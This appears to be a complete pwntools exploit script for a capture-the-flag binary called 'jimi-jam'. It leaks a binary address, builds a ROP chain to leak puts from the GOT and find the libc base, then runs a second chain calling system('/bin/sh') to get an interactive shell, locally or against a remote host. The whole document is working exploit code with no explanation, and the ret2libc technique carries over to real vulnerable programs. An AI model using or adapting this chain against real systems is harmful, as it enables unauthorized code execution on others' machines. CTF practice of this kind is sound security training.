from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *vuln+48
continue
'''.format(**locals())

exe = './jimi-jam'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

p = start()

pop_rdi_ret = 0x13a3
pop_rsi_r15_ret = 0x13a1
ret = 0x101a

p.recvuntil(b"The tour center is right here! ")
leak = int(p.recvline(), 16)
info("leak: " + hex(leak))

base_binary = elf.address = leak - elf.sym[b'ROPJAIL']


payload = flat(
    cyclic(16),
    pop_rdi_ret + base_binary,
    elf.got.puts,
    elf.plt.puts,
    elf.entrypoint
)

p.sendlineafter(b"Hey there! You're now in JIMI JAM JAIL\n", payload)
leak_puts = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info("leak got puts: " + hex(leak_puts))
base_libc = libc.address = leak_puts - libc.sym[b'puts']


payload = flat(
    cyclic(16),
    ret + base_binary,
    pop_rdi_ret + base_binary,
    next(libc.search(b"/bin/sh")),
    libc.sym[b"system"]
)

p.sendlineafter(b"Hey there! You're now in JIMI JAM JAIL\n", payload)
p.interactive()
